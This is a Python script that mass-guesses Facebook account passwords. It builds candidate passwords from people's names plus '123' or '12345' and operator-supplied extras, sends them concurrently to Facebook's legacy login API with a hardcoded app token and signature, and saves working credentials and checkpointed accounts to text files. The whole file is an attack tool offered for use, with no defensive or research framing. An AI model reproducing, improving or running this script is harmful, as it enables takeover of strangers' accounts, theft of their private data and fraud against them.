#!/usr/bin/env python3
# Author : zettamus
# Github : Zettamus
# Facebook : fb.me/zettid.1
# Telegram : t.me/zettamus
import os
import json
import requests
from concurrent.futures import ThreadPoolExecutor
global result,check,die
life = []
chek = []
result = 0
check = 0
die = 0
def sorting(users,cek=False):
    with ThreadPoolExecutor(max_workers=30) as ex:
        if not cek:
            expas = input("# extra password : ")
            expas1 = input("# extra password : ")
            expas2 = input("# extra password : ")
            expas3 = input("# extra password : ")
            expas4 = input("# extra password : ")
            expas5 = input("# extra password : ")
            for user in users:
                users = user.split('|')
                ss = users[0].split(' ')
                if len(ss) == 1:
                    pass1 = ss[0] + "123"
                    pass2 = ss[0] + "12345"
                elif len(ss) == 2:
                    pass1 = ss[0] + "123"
                    pass2 = ss[1] + "12345"
                elif len(ss) == 3:
                    pass1 = ss[1] + "123"
                    pass2 = ss[1] + "12345"
                listpass = [
                        pass1,
                        pass2,
                        expas,
                        expas1,
                        expas2,
                        expas3,
                        expas4,
                        expas5,
                    ]
                for passw in listpass:
                    ex.submit(login,(users[1]),(passw))
        else:
            for user in users:
                frx = user.split("|")
                ex.submit(login,(frx[0]),(frx[1]),(True))
    if cek:
        os.remove("results-check.txt")
        os.remove("results-life.txt")
        for x in life:
            with open('results-life.txt','a') as f:
                f.write(x+'\n')
        for x in chek:
                with open('results-check.txt','a') as f:                        f.write(x+"\n")
        print("\n# Done")
        print("# saved to results-check.txt results-life.txt")
    elif check != 0 or result != 0:
        print("\n# Done. file saved in : ")
        print("        - life : results-life.txt")
        print("        - checkpoint : results-check.txt")
        exit("# thanks for using this tools")
    else:
        print("\n# Done")
        exit("# no result")



def login(username,password,cek=False):
    global result,check,die
    b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
    params = {
            'access_token': b,
            'format': 'JSON',
            'sdk_version': '2',
            'email': username,
            'locale': 'en_US',
            'password': password,
            'sdk': 'ios',
            'generate_session_cookies': '1',
            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',                }
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params)
    if 'session_key' in response.text and "EAAA" in response.text:
        print(f"\r  \033[0;m[\033[92;mLIFE\033[0;m] {username} => {password}             ",end="")
        print()
        result += 1
        if cek:
            life.append(username+"|"+password)
        else:
                with open('results-life.txt','a') as f:
                    f.write(username + '|' + password + '\n')
    elif 'www.facebook.com' in response.json()['error_msg']:
        print(f"\r  \033[0;m[\033[93;mCHEK\033[0;m] {username} => {password}                 ",end="")
        print()
        check += 1
        if cek:
            chek.append(username+"|"+password)
        else:
            with open('results-check.txt','a') as f:
                f.write(username + '|' + password + '\n')
    else:
        die += 1
    print(f"\r# life : (\033[92;m{str(result)}\033[0;m)|checkpoint : (\033[93;m{str(check)}\033[0;m)|die : ({str(die)})",end="")
